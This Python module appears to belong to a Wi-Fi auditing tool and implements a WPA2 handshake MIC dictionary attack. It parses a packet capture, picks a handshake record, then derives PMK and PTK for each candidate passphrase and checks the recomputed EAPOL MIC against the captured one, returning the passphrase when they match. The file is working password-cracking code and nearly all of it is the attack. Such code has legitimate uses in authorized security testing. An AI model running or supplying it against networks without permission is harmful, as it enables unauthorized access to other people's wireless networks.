"""Attack 1 — WPA2 4-way-handshake MIC dictionary/mask attack.

Verifier: derive PTK from each candidate PMK, recompute the EAPOL MIC, and
compare (constant-time) to the captured MIC.
"""

from __future__ import annotations

import time
from typing import Iterable, Optional

from .. import crypto
from ..parse import parse_capture, HandshakeRecord
from ..result import Verdict, FOUND, EXHAUSTED, NA, ERROR
from ..select import select_record

ATTACK = "MIC"


def run_on_record(rec: HandshakeRecord, candidates: Iterable[str],
                  ssid: Optional[str] = None) -> Verdict:
    ssid = ssid or rec.ssid
    bssid_hex = rec.bssid.hex(":")
    if not rec.has_mic_pair():
        return Verdict(ATTACK, NA, ssid=ssid, bssid=bssid_hex,
                       detail="no usable M1+M2 / M2+M3 handshake")
    if ssid is None:
        return Verdict(ATTACK, ERROR, bssid=bssid_hex,
                       detail="SSID unknown (PBKDF2 salt); pass --ssid")
    try:
        crypto.eapol_key_descriptor_version(rec.mic_msg.eapol_frame)
        _ = crypto.compute_mic(crypto.kck_from_ptk(b"\x00" * 64), rec.mic_msg.eapol_frame)
    except crypto.UnsupportedKDV as e:
        return Verdict(ATTACK, ERROR, ssid=ssid, bssid=bssid_hex, detail=str(e))

    aa, spa = rec.aa, rec.spa
    anonce, snonce = rec.anonce, rec.snonce
    frame, cap_mic = rec.mic_msg.eapol_frame, rec.mic_msg.mic

    start = time.time()
    tried = 0
    for pw in candidates:
        if crypto.is_probably_hex_psk(pw):
            continue
        tried += 1
        pmk = crypto.compute_pmk(pw, ssid)
        ptk = crypto.derive_ptk(pmk, aa, spa, anonce, snonce)
        if crypto.verify_mic(crypto.kck_from_ptk(ptk), frame, cap_mic):
            return Verdict(ATTACK, FOUND, passphrase=pw, ssid=ssid, bssid=bssid_hex,
                           tried=tried, elapsed=time.time() - start)
    return Verdict(ATTACK, EXHAUSTED, ssid=ssid, bssid=bssid_hex,
                   tried=tried, elapsed=time.time() - start)


def run(pcap_path: str, candidates: Iterable[str], ssid: Optional[str] = None,
        bssid: Optional[str] = None) -> Verdict:
    records = parse_capture(pcap_path)
    if not records:
        return Verdict(ATTACK, NA, detail="no EAPOL frames in capture")
    rec = select_record(records, "mic", bssid)
    if rec is None:
        return Verdict(ATTACK, NA, detail="no matching BSSID")
    return run_on_record(rec, candidates, ssid)
